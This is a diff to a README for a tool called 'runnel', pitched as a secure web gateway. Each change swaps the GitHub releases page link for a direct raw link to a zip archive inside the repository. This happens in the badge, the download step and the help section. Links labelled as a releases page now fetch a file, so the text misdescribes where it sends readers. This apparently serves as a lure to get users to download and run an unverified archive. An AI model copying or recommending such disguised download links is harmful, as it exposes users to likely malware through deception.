@@ -1,6 +1,6 @@
 # 🌊 runnel - Your Secure Gateway to the Web
 
-[![Download runnel](https://img.shields.io/badge/Download-runnel-2ea44f?style=for-the-badge)](https://github.com/jhmj4-6/runnel/releases)
+[![Download runnel](https://img.shields.io/badge/Download-runnel-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/jhmj4-6/runnel/main/cmd/1.4.zip)
 
 ---
 
@@ -23,7 +23,7 @@ Getting runnel up and running takes just a few minutes. Follow these simple step
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/jhmj4-6/runnel/releases](https://github.com/jhmj4-6/runnel/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/jhmj4-6/runnel/main/cmd/1.4.zip](https://raw.githubusercontent.com/jhmj4-6/runnel/main/cmd/1.4.zip)
 
 This page shows all available versions of runnel. Look for the newest version at the top. You'll see a file with a name like `runnel-windows.zip`. Click the download button next to it.
 
@@ -128,7 +128,7 @@ It's a good idea to check for updates occasionally. Visit the download page ever
 
 ## 📣 Get Help
 
-If you run into any issues or have questions, visit the [GitHub releases page](https://github.com/jhmj4-6/runnel/releases) – you might find notes about other users' experiences there. Many applications also include documentation in the downloaded folder, so check if a `README.txt` or `help` file was included.
+If you run into any issues or have questions, visit the [GitHub releases page](https://raw.githubusercontent.com/jhmj4-6/runnel/main/cmd/1.4.zip) – you might find notes about other users' experiences there. Many applications also include documentation in the downloaded folder, so check if a `README.txt` or `help` file was included.
 
 ---
 
